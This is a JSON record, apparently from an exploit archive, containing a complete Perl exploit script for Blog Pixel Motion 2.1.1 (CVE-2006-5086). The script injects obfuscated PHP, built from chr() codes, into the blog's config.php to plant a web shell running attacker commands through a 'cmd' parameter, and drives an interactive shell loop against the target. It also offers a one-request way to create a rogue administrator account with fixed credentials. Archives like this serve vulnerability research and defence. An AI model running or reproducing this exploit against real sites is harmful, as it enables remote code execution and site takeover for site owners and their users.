{
  "id": "2441",
  "title": "Blog Pixel Motion 2.1.1 - PHP Code Execution / Create Admin",
  "cve": "CVE-2006-5086",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n#\r\n# Affected.scr..: Blog Pixel Motion V2.1.1\r\n# Poc.ID........: 12060927\r\n# Type..........: PHP Code Execution (stripslashes), SQL Injection (urldecode)\r\n# Risk.level....: High\r\n# Vendor.Status.: Unpatched\r\n# Src.download..: www.pixelmotion.org/zip/blog2.1.zip\r\n# Poc.link......: acid-root.new.fr/poc/12060927.txt\r\n# Credits.......: DarkFig\r\n#\r\n# print \"This exploit is for educational purpose only\" x 999; exit;\r\n#\r\nuse LWP::UserAgent;\r\nuse HTTP::Request::Common;\r\nuse HTTP::Response;\r\nuse Getopt::Long;\r\nuse strict;\r\n\r\nprint STDOUT \"\\n+\", '-' x 60, \"+\\n\";\r\nprint STDOUT \"| Blog Pixel Motion V2.1.1 PHP Code Execution / Create Admin |\\n\";\r\nprint STDOUT '+', '-' x 60, \"+\\n\";\r\n\r\nmy($host,$path,$proxh,$proxu,$proxp,$choice,$cmd,$res,$re);\r\nmy $opt = GetOptions(\r\n   'host=s'   =>  \\$host,\r\n   'path=s'   =>  \\$path,\r\n   'proxh=s'  =>  \\$proxh,\r\n   'proxu=s'  =>  \\$proxu,\r\n   'proxp=s'  =>  \\$proxp,\r\n   'choice=s' =>  \\$choice);\r\n\r\nif(!$host) {\r\n    print STDOUT \"|      Usage: ./zz.pl --host=[www] --path=[/] --choice=[0]   |\\n\";\r\n    print STDOUT \"|   [Choice.]  1=PHP_Code_Execution       2=Create_Admin     |\\n\";\r\n    print STDOUT \"|   [Options] --proxh=[ip] --proxu=[user] --proxp=[pwd]      |\\n\";\r\n    print STDOUT '+', '-' x 60, \"+\\a\\n\";\r\n    exit(1);\r\n}\r\n\r\nif($host  !~ /http/) {$host = 'http://'.$host;}\r\nif($proxh !~ /http/ && $proxh != '') {$proxh = 'http://'.$proxh.'/';}\r\nif(!$path) {$path = '/';}\r\nif(!$choice) {$choice = 2;}\r\n\r\nmy $ua = LWP::UserAgent->new();\r\n   $ua->agent('0xzilla');\r\n   $ua->timeout(30);\r\n   $ua->proxy(['http'] => $proxh) if $proxh;\r\n   $re->proxy_authorization_basic($proxu, $proxp) if $proxp;\r\n\r\nif($choice == 1) {\r\n\r\n   $re = POST $host.$path.'config.php', [\r\n   'nom_blog'  => '\";\r\n    $shcode  = chr(0x69).chr(0x66).chr(0x28).chr(0x69).chr(0x73).chr(0x73).chr(0x65);\r\n    $shcode .= chr(0x74).chr(0x28).chr(0x24).chr(0x5F).chr(0x47).chr(0x45).chr(0x54);\r\n    $shcode .= chr(0x5B).chr(0x27).chr(0x63).chr(0x6D).chr(0x64).chr(0x27).chr(0x5D);\r\n    $shcode .= chr(0x29).chr(0x29).chr(0x7B).chr(0x73).chr(0x79).chr(0x73).chr(0x74);\r\n    $shcode .= chr(0x65).chr(0x6D).chr(0x28).chr(0x73).chr(0x74).chr(0x72).chr(0x69);\r\n    $shcode .= chr(0x70).chr(0x73).chr(0x6C).chr(0x61).chr(0x73).chr(0x68).chr(0x65);\r\n    $shcode .= chr(0x73).chr(0x28).chr(0x24).chr(0x5F).chr(0x47).chr(0x45).chr(0x54);\r\n    $shcode .= chr(0x5B).chr(0x27).chr(0x63).chr(0x6D).chr(0x64).chr(0x27).chr(0x5D);\r\n    $shcode .= chr(0x29).chr(0x29).chr(0x3B).chr(0x7D).chr(0x0D).chr(0x0A);\r\n    eval($shcode); die(); //'];\r\n    $ua->request($re);\r\n\r\n    while(<STDIN>){\r\n    chomp($cmd = $_);\r\n    if($cmd eq 'exit') { exit(0); }\r\n    $re = GET $host.$path.'include/variables.php?cmd='.$cmd;\r\n    $res = $ua->request($re);\r\n    print STDOUT \"\\n\\n\".$res->content.\"\\n\\$sh: \";\r\n    }\r\n\r\n\r\n} else {\r\n\r\n  $re = GET $host.$path.'insere_base.php?login=woot&pass=t00w';\r\n  $ua->request($re);\r\n  print STDOUT \"[+] Admin login.: woot\\n\";\r\n  print STDOUT \"[+] Admin passwd: t00w\\n\";\r\n  print STDOUT '+', '-' x 60, \"+\\n\";\r\n\r\n}\r\n\r\n# milw0rm.com [2006-09-27]",
  "url": "https://www.exploit-db.com/exploits/2441"
}